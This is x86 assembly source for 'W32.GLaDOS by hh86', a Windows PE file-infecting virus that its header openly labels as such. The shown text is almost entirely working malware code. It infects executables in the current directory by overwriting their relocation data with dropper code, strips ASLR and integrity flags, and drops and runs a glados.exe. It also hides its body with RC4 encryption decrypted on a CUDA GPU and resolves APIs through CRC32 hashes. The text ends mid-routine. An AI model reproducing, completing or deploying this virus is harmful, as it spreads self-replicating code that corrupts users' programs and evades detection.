comment °
W32.GLaDOS by hh86
- direct action file infector of PE32 exe files on current directory
- overwrites reloc data in last section with dropper code
- virus body is encrypted by RC4 algorithm
- decryption through GPGPU on CUDA capable devices using PTX code
- WELL512 for random number generation
- CRC32 instead of API names for smaller code
°

.586
.model  flat, stdcall
include glados.inc

.data
iformat                  db     "%i", 0

.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx 
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

init_glados     label    near
        push    ebx
        mov     esi, offset glados_body + RC4KEYSIZE - 1
        mov     ebp, offset staterc4
        xor     eax, eax
        xor     edx, edx

initial_swap    label    near
        add     dl, byte ptr [esi]
        mov     bl, byte ptr [ebp + eax]
        add     dl, bl
        xchg    byte ptr [ebp + edx], bl
        mov     byte ptr [ebp + eax], bl
        inc     al
        jnz     initial_swap
        xor     ecx, ecx
        xor     ebx, ebx
        inc     esi

initial_gen     label    near
        inc     al
        mov     dl, byte ptr [ebp + eax]
        mov     cl, dl
        add     bl, dl
        xchg    byte ptr [ebp + ebx], dl
        mov     byte ptr [ebp + eax], dl
        add     cl, dl
        mov     cl, byte ptr [ebp + ecx]
        xor     cl, byte ptr [esi]
        mov     byte ptr [esi], cl
        inc     esi
        inc     edi
        cmp     di, offset glados_end - offset skip_keys
        jne     initial_gen
        push    edi
        push    offset iformat    
        push    offset ptxcount_patch
        call    wsprintf
        add     esp, 0ch
        mov     byte ptr [ptxcount_patch + 3], " "
        pop     ebx
        mov     eax, offset link_text
        sub     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        mov     dword ptr [glados_pushrva - 4], eax

;-------------------------------------------------------------------------------
;here begins the code in infected files
;-------------------------------------------------------------------------------

glados_exe      label    near
        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"

glados_pushrva  label    near
        pushad
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        xor     edx, edx
        pop     dword ptr fs:[edx]
        pop     eax
        popad
        ret

init_seh        label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      0553b5c78h                   ;CreateFileA
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0251097cch                   ;ExitProcess
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      0c97c1fffh                   ;GetProcAddress
        dd      05b4219f8h                   ;GetTickCount
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile
        dd      048fea11eh                   ;WinExec
        dd      0cce95612h                   ;WriteFile
        db      0

;-------------------------------------------------------------------------------
;choose code path
;-------------------------------------------------------------------------------

pathinst_patch  label    near
        inc     ecx
        js      skip_drop
        mov     ebp, esp
        mov     ebx, ecx
        mov     ch, high (((codesize + (sectalign - 1)) and (not (sectalign - 1))) + sectalign)
        push    ecx
        push    ecx
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + kernel32.kGlobalAlloc]
        lea     edx, dword ptr [esi - (offset pathinst_patch - offset glados_exe)]
        lea     esi, dword ptr [esi + (offset objectexe - offset pathinst_patch)]
        push    eax
        push    (offset filename - offset objectexe) shr 1
        pop     ecx
        xchg    edi, eax

expand_hdr      label    near
        lods    word ptr [esi]
        mov     bl, ah
        mov     byte ptr [edi + ebx], al
        loop    expand_hdr
        mov     ch, 2
        add     edi, ecx
        xchg    edx, esi
        mov     cx, offset glados_end - offset glados_exe
        mov     eax, edi
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     byte ptr [eax + (offset pathinst_patch - offset glados_exe)], 49h
        pop     edi
        pop     ebx
        push    edi                          ;GlobalFree
        push    ecx                          ;WinExec
        push    edx                          ;WinExec
        push    ecx                          ;WriteFile
        push    esp                          ;WriteFile
        push    ebx                          ;WriteFile
        push    edi                          ;WriteFile
        push    ecx                          ;CreateFileA
        push    ecx                          ;CreateFileA
        push    CREATE_ALWAYS                ;CreateFileA
        push    ecx                          ;CreateFileA
        push    ecx                          ;CreateFileA
        push    3                            ;CreateFileA
        push    edx                          ;CreateFileA
        call    dword ptr [ebp + kernel32.kCreateFileA]
        push    eax
        xchg    esi, eax
        call    dword ptr [ebp + kernel32.kWriteFile]
        push    esi
        call    dword ptr [ebp + kernel32.kCloseHandle]
        call    dword ptr [ebp + kernel32.kWinExec]
        call    dword ptr [ebp + kernel32.kGlobalFree]
        int     3

objectexe       label    near
        db      "M",                                IMAGE_DOS_HEADER.e_magic
        db      "Z",                                IMAGE_DOS_HEADER.e_magic + 1
        db      "P",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature
        db      "E",                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.Signature + 1
        db      low IMAGE_FILE_MACHINE_I386,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine
        db      high IMAGE_FILE_MACHINE_I386,       IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Machine + 1
        db      1,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        db      60h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.FileHeader.Characteristics
        db      low IMAGE_NT_OPTIONAL_HDR32_MAGIC,  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      high IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Magic + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint + 1
        db      0ch,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.ImageBase + 2
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment + 1
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.FileAlignment + 1
        db      4,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        db      40h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage + 1
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders + 1
        db      IMAGE_SUBSYSTEM_WINDOWS_GUI,        IMAGE_DOS_HEADER.e_maxalloc + IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        db      30h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Misc.VirtualSize + 79h
        db      10h,                                IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.VirtualAddress + 79h
        db      high (((codesize + (sectalign - 1)) and (not (sectalign - 1)))), IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.SizeOfRawData + 79h
        db      2,                                  IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.PointerToRawData + 79h
        db      0a0h,                               IMAGE_DOS_HEADER.e_maxalloc + IMAGE_SECTION_HEADER.Characteristics + 7bh

filename        label    near
        db      "glados.exe", 0

;-------------------------------------------------------------------------------
;initialize CUDA Driver API
;-------------------------------------------------------------------------------

skip_drop       label    near
        call    init_nvcuda

nvcuda          label    near
        db      "nvcuda", 0

kernel_name     label    near
        db      "h", 0

nvcuda_tbcrc    label    near
        dd      09beb7583h                   ;cuCtxCreate
        dd      0228042e0h                   ;cuCtxDestroy
        dd      01cd9f7cch                   ;cuCtxSynchronize
        dd      02054524bh                   ;cuDeviceComputeCapability
        dd      0a0d165edh                   ;cuDeviceGetAttribute
        dd      0a6b58b8bh                   ;cuDeviceGetCount
        dd      02fb978a3h                   ;cuDriverGetVersion
        dd      0499227beh                   ;cuInit
        dd      0abaf2025h                   ;cuLaunchKernel
        dd      0df62b5e9h                   ;cuMemAlloc
        dd      0b748be7dh                   ;cuMemFree
        dd      00560139ch                   ;cuMemcpyDtoH
        dd      04600e00fh                   ;cuMemcpyHtoD
        dd      0762d7398h                   ;cuModuleGetFunction
        dd      0df58bd96h                   ;cuModuleLoadDataEx
        dd      0a9cd570dh                   ;cuModuleUnload
        db      0

init_cudrv      label    near

;-------------------------------------------------------------------------------
;replace unused entrypoint VA with ExitProcess
;-------------------------------------------------------------------------------

        push    ecx
        mov     edi, esp
        mov     eax, dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kExitProcess]
        mov     dword ptr [edi + 4 + sizeof nvcudadrv + sizeof kernel32 + sizeof sehmap], eax
        mov     dword ptr [edi + 8 + sizeof nvcudadrv + sizeof kernel32 + sizeof sehmap], ecx

;-------------------------------------------------------------------------------
;get available number of CUDA capable devices
;-------------------------------------------------------------------------------

        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuInit]
        test    eax, eax
        jnz     branch_exit
        xchg    ebx, eax
        push    ebx
        push    esp
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceGetCount]
        test    eax, eax
        jnz     branch_exit
        pop     ebp
        dec     ebp                         ;always decrease because 0 is also a valid device ID
        js      branch_exit                 ;but 0 means not one ;)

;-------------------------------------------------------------------------------
;current CUDA driver must be version 5.0
;-------------------------------------------------------------------------------

        push    ebx
        push    esp
        call    dword ptr [edi + 4 + nvcudadrv.cuDriverGetVersion]
        test    eax, eax
        jnz     branch_exit
        pop     eax
        cmp     eax, CUDA_DRIVER_VERSION
        jne     branch_exit

test_device     label    near

;-------------------------------------------------------------------------------
;compute capability of the device must be 3.x
;-------------------------------------------------------------------------------

        push    ebx
        mov     edx, esp
        push    ebx
        mov     ecx, esp
        push    ebp
        push    edx
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceComputeCapability]
        test    eax, eax
        jnz     branch_ndev
        pop     eax
        pop     ecx
        cmp     eax, 3
        jne     branch_ndev

;-------------------------------------------------------------------------------
;compute mode must be CU_COMPUTEMODE_DEFAULT so that we can use it
;CU_COMPUTEMODE_EXCLUSIVE and CU_COMPUTEMODE_EXCLUSIVE_PROCESS may work too
;-------------------------------------------------------------------------------

        push    ebx
        mov     ecx, esp
        push    ebp
        push    CU_DEVICE_ATTRIBUTE_COMPUTE_MODE
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceGetAttribute]
        test    eax, eax
        pop     eax
        jnz     branch_ndev
        test    eax, eax
        jz      create_context

branch_ndev     label    near
        dec     ebp
        jns     test_device

branch_exit     label    near
        int     3

;-------------------------------------------------------------------------------
;create CUDA context in this device, load module and launch kernel (decryptor)
;-------------------------------------------------------------------------------

create_context  label    near
        push    ebp
        push    CU_CTX_SCHED_BLOCKING_SYNC
        push    edi
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxCreate]
        test    eax, eax
        jnz     branch_ndev
        lea     eax, dword ptr [esi + (offset decryptor - offset init_cudrv)]
        push    ebx
        mov     ecx, esp
        push    ebx
        push    ebx
        push    ebx
        push    eax
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleLoadDataEx]
        test    eax, eax
        pop     ecx
        jnz     context_destroy
        push    ecx
        lea     eax, dword ptr [esi - (offset init_cudrv - offset kernel_name)]
        push    ebx
        mov     edx, esp
        push    eax
        push    ecx
        push    edx
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleGetFunction]
        test    eax, eax
        pop     ebp
        jnz     module_unload
        push    ebx
        mov     edx, esp
        push    offset glados_end - offset glados_body
        push    edx
        call    dword ptr [edi + 4 + nvcudadrv.cuMemAlloc]
        test    eax, eax
        pop     eax
        jnz     module_unload
        push    eax
        add     esi, offset glados_body  - offset init_cudrv
        push    offset glados_end - offset glados_body
        push    esi
        push    eax
        call    dword ptr [edi + 4 + nvcudadrv.cuMemcpyHtoD]
        test    eax, eax
        jnz     device_memfree
        inc     eax
        push    esp
        mov     ecx, esp       
        push    ebx
        push    ecx
        push    ebx
        push    ebx
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    ebp
        call    dword ptr [edi + 4 + nvcudadrv.cuLaunchKernel]
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxSynchronize]
        pop     eax
        pop     eax
        push    eax
        push    offset glados_end - offset glados_body
        push    eax
        push    esi
        call    dword ptr [edi + 4 + nvcudadrv.cuMemcpyDtoH]

device_memfree  label    near
        call    dword ptr [edi + 4 + nvcudadrv.cuMemFree]
        
module_unload   label    near
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleUnload]

context_destroy label    near
        push    dword ptr [edi]
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxDestroy]
        jmp     skip_keys

;-------------------------------------------------------------------------------
;load CUDA Driver DLL
;-------------------------------------------------------------------------------

init_nvcuda     label    near
        call    dword ptr [esp + 4 + kernel32.kLoadLibraryA]
        add     esi, offset nvcuda_tbcrc - offset pathinst_patch
        xchg    ebp, eax
        push    esi

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

;-------------------------------------------------------------------------------
;PTX decryptor
;-------------------------------------------------------------------------------

decryptor       label    near
        db      ".version 3.0"
        db      ".target sm_30"
        db      ".entry h(.param .u32 b) {"
        db      ".local .s8 s[256];"
        db      ".reg .s32 r<11>;"
        db      ".reg .pred p;"
        db      "mov.s32 r1, 0;"
        db      "fill_states:"
        db      "mov.s32 r2, s[r1];"
        db      "st.local.s8 [r2], r1;"
        db      "add.s32 r1, r1, 1;"
        db      "setp.eq.s32 p, r1, 256;"
        db      "@!p bra fill_states;"
        db      "ld.param.s32 r9, [b];"
        db      "mov.s32 r3, 0;"
        db      "mov.s32 r1, 0;"
        db      "do_permutation:"
        db      "mov.s32 r5, s[r1];"
        db      "ld.local.s8 r4, [r5];"
        db      "mov.s32 r6, r4;"
        db      "mov.s32 r7, r5;"
        db      "add.s32 r3, r3, r4;"
        db      "rem.s32 r4, r1, 16;"
        db      "add.s32 r5, r9, r4;"
        db      "ld.global.s8 r4, [r5];"
        db      "add.s32 r3, r3, r4;"
        db      "and.b32 r3, r3, 0xff;"
        db      "mov.s32 r5, s[r3];"
        db      "ld.local.s8 r4, [r5];"
        db      "st.local.s8 [r7], r4;"
        db      "st.local.s8 [r5], r6;"
        db      "add.s32 r1, r1, 1;"
        db      "setp.eq.s32 p, r1, 256;"
        db      "@!p bra do_permutation;"
        db      "mov.s32 r1, 0;"
        db      "mov.s32 r3, 0;"
        db      "mov.s32 r8, 0;"
        db      "decrypt:"
        db      "add.s32 r1, r1, 1;"
        db      "and.b32 r1, r1, 0xff;"
        db      "mov.s32 r5, s[r1];"
        db      "ld.local.s8 r4, [r5];"
        db      "mov.s32 r6, r4;"
        db      "mov.s32 r7, r5;"
        db      "add.s32 r3, r3, r4;"
        db      "and.b32 r3, r3, 0xff;"
        db      "mov.s32 r5, s[r3];"
        db      "ld.local.s8 r4, [r5];"
        db      "st.local.s8 [r7], r4;"
        db      "st.local.s8 [r5], r6;"
        db      "add.s32 r6, r6, r4;"
        db      "and.b32 r6, r6, 0xff;"
        db      "mov.s32 r5, s[r6];"
        db      "ld.local.s8 r4, [r5];"
        db      "ld.global.s8 r2, [r9+16];"
        db      "xor.b32 r4, r4, r2;"
        db      "st.global.b8 [r9+16], r4;"
        db      "add.s32 r9, r9, 1;"
        db      "add.s32 r8, r8, 1;"
        db      "setp.eq.s32 p, r8, "

ptxcount_patch  label    near
        db      "****"
        db      ";@!p bra decrypt;"
        db      "exit;}"
        db      0

;-------------------------------------------------------------------------------
;here begins encrypted virus body in infected files
;-------------------------------------------------------------------------------

glados_body     label    near
        dd      0, 0, 0, 0

;-------------------------------------------------------------------------------
;initialize random number generator
;-------------------------------------------------------------------------------

skip_keys       label    near
        add     esi, offset state - offset glados_body
        mov     byte ptr [esi + (offset index - offset state) - 1], bl
        mov     bl, ((offset skip_state - offset state) shr 2) - 1

init_rngstate   label    near
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kGetTickCount]
        mov     dword ptr [esi + ebx * 4], eax
        dec     ebx
        jns     init_rngstate
        inc     ebx
        enter   sizeof WIN32_FIND_DATA, 0
        push    "*"
        mov     esi, esp
        push    esi
        push    esi
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindFirstFileW]
        xchg    ebp, eax

map_file        label    near
        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kSetFileAttributesW]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCreateFileW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kMapViewOfFile]
        push    eax
        pushad
        call    infect_exe

delta_unmapseh  label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kUnmapViewOfFile]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCloseHandle]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCloseHandle]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kSetFileAttributesW]
        push    esi
        push    ebp
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindNextFileW]
        test    eax, eax
        jnz     map_file
        push    ebp
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindClose]

breakpoint      label    near

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

        int     3

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE files
;-------------------------------------------------------------------------------

infect_exe      label    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        push    eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Machine], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Magic], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;SizeOfOptionalHeader must indicate that it covers at least until reloc fields entries
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_RELOC_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    breakpoint
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
        jnae    skip_ldcchk
        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows CUI/GUI subsystem file only
;-------------------------------------------------------------------------------

        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        dec     ecx
        dec     ecx
        jz      test_relocs
        dec     ecx
        jnz     breakpoint

;-------------------------------------------------------------------------------
;relocs must be physically/virtually located whithin the last section
;-------------------------------------------------------------------------------

test_relocs     label    near
        imul    cx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections], sizeof IMAGE_SECTION_HEADER
        lea     esi, dword ptr [eax + edx + (IMAGE_NT_HEADERS.OptionalHeader.Magic - sizeof IMAGE_SECTION_HEADER) + IMAGE_SECTION_HEADER.VirtualAddress]
        add     esi, ecx
        mov     edx, dword ptr [esi]
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        mov     ecx, dword ptr [ebx]
        cmp     ecx, edx
        jb      breakpoint
        mov     ebp, dword ptr [ebx + 4]
        cmp     ebp, offset glados_end - offset glados_exe
        jb      breakpoint
        push    ebp
        add     ebp, ecx
        cmp     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebp
        jnb     test_physsize

infect_innerbp  label    near
        int     3

test_physsize   label    near 
        pop     ebp        
        pop     edi
        push    ecx
        add     edi, dword ptr [esi + (IMAGE_SECTION_HEADER.PointerToRawData - IMAGE_SECTION_HEADER.VirtualAddress)]
        sub     ecx, edx
        add     edi, ecx
        add     ecx, ebp
        cmp     dword ptr [esi + (IMAGE_SECTION_HEADER.SizeOfRawData - IMAGE_SECTION_HEADER.VirtualAddress)], ecx
        jb      infect_innerbp

;-------------------------------------------------------------------------------
;clear *_NO_SEH to enable SEH, and *_FORCE_INTEGRITY to infect files signed files
;clear *_DYNAMIC_BASE to disable ASLR
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY or IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)

;-------------------------------------------------------------------------------
;clear base relocations data directory entries
;-------------------------------------------------------------------------------

        xor     ecx, ecx
        bts     dword ptr [eax + IMAGE_NT_HEADERS.FileHeader.Characteristics], ecx
        mov     dword ptr [ebx], ecx
        mov     dword ptr [ebx + 4], ecx

;-------------------------------------------------------------------------------
;copy decryptor code
;-------------------------------------------------------------------------------

        push    edi
        push    eax
        push    esi
        mov     esi, dword ptr [esp + 10h + sehmap.pExceptionHandler]
        sub     esi, offset delta_unmapseh - offset glados_exe
        mov     cx, offset glados_body - offset glados_exe
        rep     movs byte ptr [edi], byte ptr [esi]

;-------------------------------------------------------------------------------
;store 128-bit key at the beginning of virus body (yes, key is unprotected, easily recoverable)
;-------------------------------------------------------------------------------

;-------------------------------------------------------------------------------
;WELL512 (Well Equidistributed Long-period Linear) PRNG algorithm by Francois Panneton,
;Pierre L'Ecuyer and Makoto Matsumoto.  ported to C/C++ for uint generation by Chris Lomont
;-------------------------------------------------------------------------------

        push    edi
        call    skip_state

state           label    near
        dd      "****", "****", "****", "****", "****", "****", "****", "****"
        dd      "****", "****", "****", "****", "****", "****", "****", "****"

skip_state      label    near
        pop     ebp
        mov     cl, RC4KEYSIZE / 4

store_dword     label    near
        push    0                            ;replaced by random value

index           label    near
        pop     eax
        push    ecx
        mov     ecx, dword ptr [ebp + eax * 4]
        lea     ebx, dword ptr [eax + 0dh]
        lea     edx, dword ptr [ecx + ecx]
        and     ebx, 0fh
        xor     edx, dword ptr [ebp + ebx * 4]
        shl     edx, 0fh
        xor     edx, dword ptr [ebp + ebx * 4]
        lea     ebx, dword ptr [eax + 9]
        and     ebx, 0fh
        xor     edx, ecx
        mov     ecx, dword ptr [ebp + ebx * 4]
        shr     ecx, 0bh
        xor     ecx, dword ptr [ebp + ebx * 4]        
        mov     ebx, edx
        xor     ebx, ecx
        mov     dword ptr [ebp + eax * 4], ebx
        and     ebx, 0fed22169h
        shl     ebx, 5
        xor     ebx, dword ptr [ebp + eax * 4]
        dec     eax
        and     eax, 0fh
        shl     ecx, 0ah
        xor     ecx, edx
        shl     ecx, 10h
        xor     ecx, dword ptr [ebp + eax * 4]
        shl     ecx, 2
        xor     ecx, ebx
        xor     ecx, edx
